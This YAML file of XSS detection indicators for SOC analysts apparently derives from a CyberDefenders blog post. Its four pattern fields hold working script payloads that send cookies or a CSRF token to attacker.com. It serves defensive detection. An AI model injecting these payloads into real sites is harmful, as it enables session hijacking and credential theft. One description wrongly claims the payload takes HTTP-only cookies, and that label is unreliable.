topic: Cross-Site Scripting (XSS) Indicators for SOC Analysts
indicators:
- id: xss-reflected-payload
  pattern: <script>var img = new Image();img.src = 'https://attacker.com/log?cookie=' + encodeURIComponent(document.cookie);</script>
  severity_baseline: low
  description: Detects a reflected XSS payload in web application responses.
  tool_hint: browser
  applicable_evidence_types:
  - web_application_response
- id: xss-http-only-cookie-exfiltration
  pattern: <script>var token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');fetch('https://attacker.com/log?token='
    + token);</script>
  severity_baseline: medium
  description: Detects an XSS payload that exfiltrates HTTP-only cookies.
  tool_hint: browser
  applicable_evidence_types:
  - web_application_response
- id: xss-session-hijacking
  pattern: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
  severity_baseline: high
  description: Detects an XSS payload that hijacks user sessions by stealing cookies.
  tool_hint: browser
  applicable_evidence_types:
  - web_application_response
- id: xss-reflected-in-html
  pattern: <p>Welcome, <script>document.location='https://attacker.com/steal?c='+document.cookie</script>!</p>
  severity_baseline: low
  description: Detects a reflected XSS payload embedded in HTML content.
  tool_hint: browser
  applicable_evidence_types:
  - web_application_response
source_url: https://cyberdefenders.org/blog/cross-site-scripting-xss/
source_title: Cross-Site Scripting (XSS) for SOC Analysts
